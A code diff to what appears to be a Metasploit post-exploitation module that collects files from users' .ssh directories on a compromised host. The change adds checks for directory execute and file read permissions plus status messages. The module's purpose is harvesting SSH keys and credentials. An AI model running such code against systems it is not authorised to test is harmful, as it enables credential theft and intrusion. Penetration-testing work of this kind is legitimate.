@@ -35,13 +35,19 @@ class MetasploitModule < Msf::Post
       return
     end
 
+    print_status("Looting #{paths.count} .ssh directories")
     download_loot(paths)
   end
 
   def download_loot(paths)
-    print_status("Looting #{paths.count} directories")
     paths.each do |path|
       path.chomp!
+      print_status("Looting #{path} directory")
+      unless executable?(path)
+        print_warning("Can not access the directory. Missing execute bit. Skipping.")
+        next
+      end
+
       if session.type == "meterpreter"
         sep = session.fs.file.separator
         files = session.fs.dir.entries(path)
@@ -55,6 +61,11 @@ class MetasploitModule < Msf::Post
       user = path_array.pop
       files.each do |file|
         next if [".", ".."].include?(file)
+        unless readable?(path + sep + file)
+          print_warning("Can not read file: #{path}#{sep}#{file} . Missing read permission. Skipping.")
+          next
+        end
+
         data = read_file("#{path}#{sep}#{file}")
         file = file.split(sep).last
 
